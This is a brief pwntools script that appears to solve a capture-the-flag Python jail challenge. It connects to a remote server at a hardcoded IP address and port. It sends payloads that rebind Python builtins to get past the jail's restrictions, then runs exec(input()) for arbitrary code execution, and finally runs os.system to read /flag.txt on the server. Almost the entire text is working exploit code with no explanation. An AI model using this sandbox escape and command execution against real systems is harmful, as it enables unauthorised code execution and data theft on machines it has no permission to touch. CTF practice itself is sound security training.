from pwn import *

#p = process(["python3","chall.py"])
p = remote('103.181.183.216',19002)
p.sendline(b"(int:=type(None))()")
p.sendline(b"(exit:=str)")
p.sendline(b"exec(input())")
p.sendline(b"__import__('os').system('cat /flag.txt')")
p.interactive()
